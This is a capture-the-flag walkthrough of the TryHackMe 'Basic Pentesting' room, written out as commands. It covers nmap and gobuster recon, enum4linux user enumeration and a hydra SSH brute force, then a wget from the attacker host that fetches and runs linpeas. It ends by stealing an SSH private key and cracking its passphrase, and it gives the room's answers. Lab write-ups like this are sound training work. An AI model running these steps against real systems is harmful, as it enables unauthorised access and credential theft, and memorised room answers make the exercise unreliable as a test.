# Basic Pentesting: Unraveling the Machine - A TryHackMe Walkthrough

This write-up documents the steps taken to successfully complete the [Basic Pentesting JT TryHackMe room](https://tryhackme.com/room/basicpentestingjt). We'll cover everything from initial enumeration to privilege escalation, detailing the tools and techniques used.

 ## Task 1: Web App Testing and Privilege Escalation  
## 1. Setting the Stage: Deploying and Connecting
*(No answer needed here, as this is the initial setup phase. With the machine deployed and our network connected, we're ready to dive in!)*
   
## 2. Initial Reconnaissance: Uncovering Exposed Services
   Our first move was to understand what services the target machine (`10.10.236.69`) was running. We used `nmap` for a thorough port and service scan:  
   ```bash 
   nmap -sS -sC -A -p- -T5 10.10.236.69 | tee nmap-enum
  ```
   ![Screenshot 2025-06-02 192004](https://github.com/user-attachments/assets/0e49b99c-592d-4896-8035-b05887fe2a40)  
   - This comprehensive scan quickly revealed several interesting open ports:  
   - 22 (SSH): A standard remote access service.  
   - 80 (HTTP): A web server, ripe for investigation.  
   - 139 and 445 (SMB): Indicating potential Windows shares.  
   - 8009 (AJP): Likely a Tomcat AJP connector, often paired with Apache.  
   - 8080 (HTTP): Another HTTP service, commonly a default Tomcat port.  

## 3. What is the name of the hidden directory on the web server (enter name without /)?  
   With port 80 (HTTP) open, our attention turned to the web server. We used gobuster to aggressively search for hidden directories that might not be publicly linked.  
   ```bash 
   gobuster dir -u http://10.10.236.69/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -o gobuster-bruteforce
   ``` 
   ![Screenshot 2025-06-02 192530](https://github.com/user-attachments/assets/455e6c9f-5473-44c7-a322-737c30d2d7a5)  
   The scan quickly hit gold, revealing a significant directory: development  

## 4. Unmasking Users: Brute-Forcing Credentials  
   *(This stage encompasses the next few steps where we identify usernames and passwords.)*  

## 5. Identifying Potential Usernames  
   Before we could try to log in, we needed valid usernames. We leveraged `enum4linux` to enumerate SMB shares and identify system users:  
   ```bash 
   enum4linux -a 10.10.236.69 | tee enum4linux-out
   ```  
   ![Screenshot 2025-06-02 192958](https://github.com/user-attachments/assets/24886eed-ced9-482f-b711-5442605c4785)  
   This enumeration provided two crucial usernames: jan and kay.  
   
## 6. Cracking the Password for SSH  
   With the username `jan` in hand, our next logical step was to attempt an SSH login. We used `hydra` to brute-force the password against the SSH service, combining a list of common users with a robust password list.  
   ```bash
   hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.236.69 -t 4
   ```
   ![Screenshot 2025-06-02 194006](https://github.com/user-attachments/assets/e50d74af-8af7-427b-9d51-48791dc50737)  
   Success! `hydra` found the password for `jan`: armando

## 7. Gaining Initial Access: The SSH Gateway  
   With jan's credentials (jan:armando), we could now establish our first foothold on the server.  
   ```bash 
   ssh jan@10.10.236.69
   ```
   ![Screenshot 2025-06-02 194300](https://github.com/user-attachments/assets/6d9b31c2-2d07-4582-b7ef-982476f42e49)  
   The service we used to access the server was **SSH**.

## 8. Post-Exploitation: Hunting for Privilege Escalation Vectors  
   Once inside as `jan`, our next mission was to find a way to elevate our privileges. `linpeas.sh` is an excellent script for automatically identifying potential escalation paths.  
   
   First, we needed to transfer `linpeas.sh` to the target machine. We set up a simple HTTP server on our local attacking machine:  
   ```bash 
   On my local machine:  
   python3 -m http.server 8000
   ```
  Then, from the target machine, we downloaded and executed `linpeas.sh`:
  ```bash
   On the target machine (as jan):  
   wget http://10.50.46.117:8000/linpeas.sh  
   chmod +x linpeas.sh  
   ./linpeas.sh
   ```
   ![Screenshot 2025-06-02 201123](https://github.com/user-attachments/assets/48c774f9-26b8-4684-8013-a8acdcc52098)  
   `linpeas.sh` ran its checks and, importantly, highlighted information about another user on the system: kay.  

## 9. Discovering Another User  
   As revealed by `linpeas.sh`, the other user found on the system is: kay  

## 10. Privilege Escalation: A Key to Kay's Kingdom  
  Finding the `kay` user was a significant lead! A quick check of `/home/kay/.ssh/` revealed a private SSH key (`id_rsa`). This was our golden ticket for privilege escalation to `kay`'s account.  
  1. Transferring the Key: We began by securely copying `kay`'s private key to our local machine:  
  ```bash
    scp jan@10.10.236.69:/home/kay/.ssh/id_rsa  
  ```
  2. **Setting Permissions**: SSH keys require strict permissions to be usable:  
  ```bash
    chmod 600 id_rsa
  ```
  3. Attempting SSH Login: We tried to log in as `kay` using the transferred key:  
  ```bash
    ssh -i id_rsa kay@10.10.236.69
  ```
  A minor setback: the key was **passphrase protected**.  
  
  4. **Cracking the Passphrase**: No problem! We used `ssh2john.py` to convert the key into a hash, and then `John the Ripper` with the `rockyou.txt` wordlist to crack the passphrase.  
  ```bash
    python3 /opt/john/ssh2john.py id_rsa > id_rsa.hash  
    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  ```
  ![Screenshot 2025-06-02 202337](https://github.com/user-attachments/assets/5120b8ca-6842-4578-8608-89e8f99ee753)  
    `John the Ripper` quickly revealed the passphrase: **beeswax** 
    
  5. **Final Login as Kay**: With the passphrase in hand, we could finally connect to `kay`'s account:  
  ```bash
    ssh -i id_rsa kay@10.10.236.69
  ```
  Once authenticated as kay, we listed the files in the home directory and discovered pass.bak:
  ![Screenshot 2025-06-02 202853](https://github.com/user-attachments/assets/23b4ea14-4593-4574-9170-0998f0c86013)  
  ```bash
    ls -la  
    cat pass.bak
  ```
  The content of pass.bak was:  
  `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`  
  
  This concludes the walkthrough for the Basic Pentesting JT room. We successfully enumerated services, found hidden directories, brute-forced user credentials, gained initial SSH access, and finally, escalated privileges to another user using a compromised SSH key.
